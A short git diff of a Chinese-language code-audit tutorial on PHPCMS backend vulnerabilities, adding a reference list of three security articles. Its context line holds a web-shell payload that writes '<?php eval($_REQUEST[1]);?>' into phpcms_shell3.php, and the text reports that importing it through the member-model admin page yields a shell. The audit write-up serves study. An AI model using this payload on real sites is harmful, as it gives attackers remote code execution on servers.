@@ -252,6 +252,9 @@ array(1);$b=file_put_contents("phpcms_shell3.php",'<?php eval($_REQUEST[1]);?>')
 ```
 在`用户 > 会员模型管理 > 管理会员模型 >`中点击"添加会员模型"：  
 ![string2array](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/imgs/string2array.PNG)  
-导入上述txt， 可发现成功生成第三个shell  
+导入上述txt， 可发现成功生成第三个shell    
 
-
+# 参考文献
+[1]. [代码审计之如何找到phpcms的代码执行漏洞](https://nosec.org/home/detail/2120.html)  
+[2]. [代码审计实战思路之浅析PHPCMS](https://www.freebuf.com/articles/web/195737.html)  
+[3]. [某cmsv9.6.3之后台几处漏洞分析](https://xz.aliyun.com/t/4108?accounttraceid=66e908a3-638e-4f1a-9140-064c279671fd)  
